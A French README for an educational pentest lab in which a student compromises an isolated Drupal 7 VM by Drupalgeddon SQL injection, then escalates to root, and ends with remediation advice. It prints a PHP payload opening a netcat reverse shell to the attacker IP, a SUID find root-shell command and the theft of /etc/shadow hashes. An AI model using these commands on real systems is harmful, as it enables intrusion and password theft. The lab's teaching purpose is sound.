# Pentest Lab : Chaîne d'Exploitation Web & Système (Drupal to Root)

![Root Proof](preuves/06_root_proof.png)


##  Disclaimer 
Ce projet a été réalisé dans un **environnement de laboratoire contrôlé et isolé** à des fins éducatives et académiques. Aucune infrastructure réelle n'a été ciblée. L'objectif est d'apprendre à sécuriser les systèmes en comprenant les mécanismes d'attaque.

---

## Environnement de Travail & Objectifs

### Le Scénario
L'objectif de ce projet est de réaliser un **audit en boîte noire (Black Box)**. Cela signifie que l'analyse démarre sans aucune connaissance préalable de la cible : aucun identifiant, aucune documentation technique, ni code source n'a été fourni.

### L'Architecture du Lab
L'infrastructure a été déployée virtuellement sous **VMware** dans un réseau privé isolé (*Host-Only*) pour éviter toute interaction avec l'extérieur.

* **Machine Attaquant (Kali Linux) :** `192.168.78.131`
    * Outils : Nmap, Python, Netcat, John the Ripper.
* **Machine Cible (Victime) :** `192.168.78.132`
    * OS : Linux (Debian).
    * État initial : Inconnu.

---

## Phase 1 : Reconnaissance & Repérage

La première étape a consisté à cartographier la surface d'attaque de la machine cible à l'aide d'un scan de ports.

**Commande exécutée :** `nmap -sV 192.168.78.132`

![Nmap Scan](preuves/02_nmap_result.png)

**Services identifiés :**
* **Port 22 (TCP) :** SSH (OpenSSH 6.0p1).
* **Port 80 (TCP) :** Serveur HTTP (Apache 2.2.22).
* **Port 111 (TCP) :** rpcbind.

L'analyse du service Web (Port 80) et du fichier `robots.txt` a révélé la présence d'un CMS **Drupal**. L'inspection du code source a permis d'identifier une version obsolète : **Drupal 7.x**.

---

## Analyse des Vulnérabilités

Les résultats de la phase de reconnaissance ont mis en évidence une surface d'attaque critique : un CMS **Drupal 7** non maintenu. Cette version est historiquement connue pour être vulnérable à des failles de sécurité majeures (notamment "Drupalgeddon").

Face à ce constat, l'audit s'est orienté vers une recherche ciblée de vulnérabilités publiques (CVE). Cette énumération a confirmé l'existence d'une chaîne d'exploitation complète, permettant de passer d'un simple visiteur web à un administrateur système "Root".

**Vecteurs d'attaque identifiés :**
1.  **Web :** Injection SQL (CVE-2014-3704).
2.  **Applicatif :** Mauvaise configuration du module "PHP Filter".
3.  **Système :** Permissions SUID dangereuses sur des binaires système.

---

## Exploitation (Kill Chain)

### Étape 1 : Intrusion Initiale (SQL Injection)
Exploitation de la faille **CVE-2014-3704 (Drupalgeddon)**. Cette vulnérabilité dans l'API de base de données de Drupal permet d'injecter des commandes SQL sans authentification.
* **Action :** Injection d'un nouvel utilisateur dans la table `users` avec les droits Administrateur.
* **Résultat :** Accès au panneau d'administration du CMS.

![Exploit SQLi](preuves/04_sqli_exploit.png)

### Étape 2 : Exécution de Code (RCE & Reverse Shell)
Une fois connecté en tant qu'administrateur, utilisation du module natif **PHP Filter**. Ce module, mal configuré, permet d'exécuter du code PHP arbitraire dans les pages du site.
* **Payload :** `<?php system('nc -e /bin/bash 192.168.78.131 4444'); ?>`
* **Résultat :** Obtention d'un shell distant sur la machine Kali (utilisateur `www-data`).

![Reverse Shell](preuves/05_reverse_shell.png)

### Étape 3 : Escalade de Privilèges (Vers Root)
Analyse des fichiers disposant de la permission **SUID** (Set User ID). Découverte d'une configuration critique sur la commande `find`.
* **Commande d'escalade :** `find . -exec '/bin/sh' \;`
* **Résultat :** Le binaire `find` s'exécute en root, lançant un shell avec les privilèges **Root (uid=0)**.

## Étape 4 : Post-Exploitation 
Une fois l'accès root obtenu, lecture du fichier sensible `/etc/shadow` pour exfiltrer les empreintes (hashs) des mots de passe utilisateurs.
* **Action :** Utilisation de **John the Ripper** pour casser les hashs SHA-512 par attaque dictionnaire.
* **Résultat :** Récupération du mot de passe root/utilisateur (faible complexité), permettant une persistance sur le système.
---

## Synthèse

L'audit a révélé un niveau de risque **CRITIQUE**. La combinaison d'un CMS obsolète et d'une négligence dans la configuration système (SUID) permet une compromission totale du serveur.

**Impacts pour l'entreprise :**
* **Confidentialité :** Exfiltration possible de la base de données clients et des fichiers système (`/etc/shadow`).
* **Intégrité :** Modification ou suppression totale des données du site.
* **Disponibilité :** Risque de sabotage ou d'interruption de service.

**Plan d'action prioritaire :**
1.  **Mise à jour :** Migrer Drupal vers la dernière version stable pour corriger la faille SQLi.
2.  **Durcissement Système :** Retirer le bit SUID des exécutables non essentiels (`chmod u-s /usr/bin/find`).
3.  **Moindre Privilège :** Désactiver le module *PHP Filter* s'il n'est pas strictement nécessaire.

---

## Documentation
Pour le détail technique complet, les scripts utilisés et l'analyse approfondie, consultez le rapport complet :
 **[Lire le Rapport d'Audit (PDF)](rapport/Rapport_Audit_R502_Moine_Fabien.pdf)**

##  Auteur
**Fabien MOINE** 
